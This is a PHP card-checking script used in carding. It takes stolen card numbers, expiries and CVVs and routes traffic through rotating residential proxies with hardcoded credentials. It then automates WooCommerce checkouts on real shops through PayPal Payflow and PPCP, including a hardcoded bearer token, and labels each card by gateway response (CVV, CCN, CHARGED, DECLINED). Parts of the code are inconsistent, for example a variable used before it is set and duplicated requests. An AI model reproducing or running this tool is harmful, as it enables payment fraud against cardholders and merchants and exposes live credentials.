<?php

require "z.php";


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];


if (strlen($ano) == 4) {
    $ano = substr($ano, 2); // Return the last two digits
}


$startTime = microtime(true);
$retries = 0;
retry:


$proxy = false;

if (!$proxy) {
  $proxys = array(
      "proxy.froxy.com:9000"
  );
  $proxy = $proxys[array_rand($proxys)];
}

$proxyauth = false;

if (!$proxyauth) {
  $proxyauths = array(
      "h0Gjv29gmYBpqsc7:wifi;us;;;",
      "h0Gjv29gmYBpqsc7:wifi;fr;;;",
      "h0Gjv29gmYBpqsc7:wifi;de;;;",
      "h0Gjv29gmYBpqsc7:wifi;ph;;;",
      "h0Gjv29gmYBpqsc7:wifi;jp;;;",
      "h0Gjv29gmYBpqsc7:wifi;sg;;;",
      "h0Gjv29gmYBpqsc7:wifi;id;;;",
      "h0Gjv29gmYBpqsc7:wifi;in;;;",
      "h0Gjv29gmYBpqsc7:wifi;ca;;;",
      "h0Gjv29gmYBpqsc7:wifi;au;;;",
      "h0Gjv29gmYBpqsc7:wifi;ar;;;",
      "h0Gjv29gmYBpqsc7:wifi;br;;;",
      "h0Gjv29gmYBpqsc7:wifi;cn;;;",
      "h0Gjv29gmYBpqsc7:wifi;fr;;;",
      "h0Gjv29gmYBpqsc7:wifi;de;;;",
      "h0Gjv29gmYBpqsc7:wifi;in;;;",
      "h0Gjv29gmYBpqsc7:wifi;id;;;",
      "h0Gjv29gmYBpqsc7:wifi;it;;;",
      "h0Gjv29gmYBpqsc7:wifi;jp;;;",
      "h0Gjv29gmYBpqsc7:wifi;kr;;;",
      "h0Gjv29gmYBpqsc7:wifi;mx;;;",
      "h0Gjv29gmYBpqsc7:wifi;ru;;;",
      "h0Gjv29gmYBpqsc7:wifi;sa;;;",
      "h0Gjv29gmYBpqsc7:wifi;za;;;",
      "h0Gjv29gmYBpqsc7:wifi;tr;;;",
      "h0Gjv29gmYBpqsc7:wifi;gb;;;",
      "h0Gjv29gmYBpqsc7:wifi;us;;;"
  );
  $proxyauth = $proxyauths[array_rand($proxyauths)];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api64.ipify.org/?format=json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

if ($data && isset($data['ip'])) {
     'IP: ' . $data['ip'];
    }
    
if (isset($response)){
    $ip = "✅";
}
if (empty($response)){
    $ip = "❌";
}


#ADD TO CART
//1st Curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://libertyordeathusa.com/product/4x8-confederate-flag-vinyl-bumper-sticker/');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '------WebKitFormBoundaryBJRfKHGlHBfbmXhe
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryBJRfKHGlHBfbmXhe
Content-Disposition: form-data; name="add-to-cart"

430
------WebKitFormBoundaryBJRfKHGlHBfbmXhe--';
$headers = array();
$headers[] = 'authority: libertyordeathusa.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryBJRfKHGlHBfbmXhe';
$headers[] = 'origin: https://libertyordeathusa.com';
$headers[] = 'referer: https://libertyordeathusa.com/product/4x8-confederate-flag-vinyl-bumper-sticker/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));

$b = curl_exec($ch);



# CHECKOUT

//2nd Curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://libertyordeathusa.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: libertyordeathusa.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'referer: https://libertyordeathusa.com/product/4x8-confederate-flag-vinyl-bumper-sticker/';
$headers[] = 'user-agent: '.$ua.'';
#$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$cn = v($d ,'"client_token_nonce":"','"');
//echo 'Nonce: '.$n.'<br>';
//echo 'cn: '.$cn.'<br>';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://libertyordeathusa.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=sawhn&billing_country=US&billing_address_1=2510+NE+VIVION+RD&billing_address_2=34&billing_city=KANSAS+CITY&billing_state=MO&billing_postcode=64118&billing_phone='.$phone.'&billing_email='.$email.'&shipping_first_name=shawnpoll&shipping_last_name=shawnpoll&shipping_company=sawhn&shipping_country=US&shipping_address_1=2510+NE+VIVION+RD&shipping_address_2=34&shipping_city=KANSAS+CITY&shipping_state=MO&shipping_postcode=64118&shipping_phone=0912+063+95423&order_comments=&shipping_method%5B0%5D=flat_rate%3A5&payment_method=paypal_pro_payflow&paypal_pro_payflow-card-number='.$cc.'&paypal_pro_payflow-card-expiry='.$mes.'+%2F+'.$ano.'&paypal_pro_payflow-card-cvc='.$cvv1.'&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';
$headers = array();
$headers[] = 'authority: libertyordeathusa.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://libertyordeathusa.com';
$headers[] = 'referer: https://libertyordeathusa.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
//$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
//$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

echo $j = curl_exec($ch);

$y = curl_exec($ch);
$client_token = v($y, '"data":"','="');
$decodedToken = base64_decode($client_token);
$tokenData = json_decode($decodedToken, true);
$bearer = $tokenData['authorizationFingerprint'];
$orders = $ro1->data->orders->orders;

//echo htmlentities($d);
//echo 'client_token: '.$client_token.'<br>';
//echo 'Bearer: '.$bearer.'<br>';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cors.api.paypal.com/v2/checkout/orders/'.$orders.'/confirm-payment-source');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = '{"payment_source":{"card":{"number":"'.$cc.'","expiry":"20'.$ano.'-'.$mes.'","security_code":"'.$cvv1.'","name":"shawnpoll shawnpoll","attributes":{"verification":{"method":"SCA_WHEN_REQUIRED"}}}},"application_context":{"vault":false}}';
$headers = array();
$headers[] = 'authority: cors.api.paypal.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'authorization: Bearer A21AAMrBToFhdZHutcfrPxP2cRy9guokEPKv-SqYf4PDZHM_OYLw1Xi0K-OU45hxYjl680yDM58mLeStQ6uX_6b-K3JaZzkxQ';
$headers[] = 'Braintree-Sdk-Version: 3.32.0-payments-sdk-dev';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'Paypal-Client-Metadata-Id: 0587bb6c415942dd579f79f40f3e0f8b';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
//$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
//$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

echo $h = curl_exec($ch);


$a = curl_exec($ch);
$ro1 = json_decode($a);
$ppcpresumeorder = $ro1->data->ppcpresumeorder->ppcpresumeorder;
$account_password = $ro1->data->account_password->account_password;

//echo 'Token: '.$token.'<br>';
//echo $a.'<br>';


//5th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://startmeabiz.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'ws_opt_in_nonce='.$n.'&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=sawhn&billing_country=US&billing_address_1=2510+NE+VIVION+RD&billing_address_2=34&billing_state=MO&billing_city=KANSAS+CITY&billing_postcode=64118&billing_phone='.$phone.'&billing_email='.$email.'&billing_rut=&billing_cpf=&billing_t_id=&billing_neighborhood=&account_password='.$account_password.'&shipping_first_name=shawnpoll&shipping_last_name=shawnpoll&shipping_company=sawhn&shipping_country=US&shipping_address_1=2510+NE+VIVION+RD&shipping_address_2=&shipping_state=NY&shipping_city=KANSAS+CITY&shipping_postcode=64118&shipping_rut=&shipping_cpf=&shipping_t_id=&shipping_neighborhood=&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=ppcp-credit-card-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-resume-order=pcp_customer_t_298fc70b06b74e974e76d2f648bf92';
$headers = array();
$headers[] = 'authority: startmeabiz.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://startmeabiz.com';
$headers[] = 'referer: https://startmeabiz.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
//$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

echo $e = curl_exec($ch);
$ro2 = json_decode($e, true);;
$result = $ro2['result'];
$message = trim(strip_tags($ro2['messages']));
$url = $ro2['redirect'];
$od = $ro2['order_id'];

$endTime = microtime(true);
$overallTime = $endTime - $startTime;
//echo $e;
//echo '<br>Result: '.$result.'  Message Reason: '.$messageReason;


if(strpos($message, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if(strpos($message, 'The card verification number does not match') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ PayFlow + Woo ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if(strpos($message, 'Insufficient funds in account') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if($message === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if($message === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if (empty($e)) {
  goto retry;
}
else if (strpos($e, 'We were unable to process your order')) {
  goto retry;
}   
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
curl_close($ch);
ob_flush();
unlink($cx);
?>